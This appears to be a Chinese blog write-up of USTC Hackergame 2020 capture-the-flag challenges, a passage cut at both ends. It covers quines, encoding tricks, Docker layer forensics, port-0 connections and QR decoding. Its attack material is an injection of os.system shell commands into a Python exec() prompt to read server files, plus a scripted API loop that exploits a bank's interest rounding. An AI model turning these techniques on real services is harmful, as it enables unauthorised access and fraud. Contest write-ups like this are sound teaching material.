class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    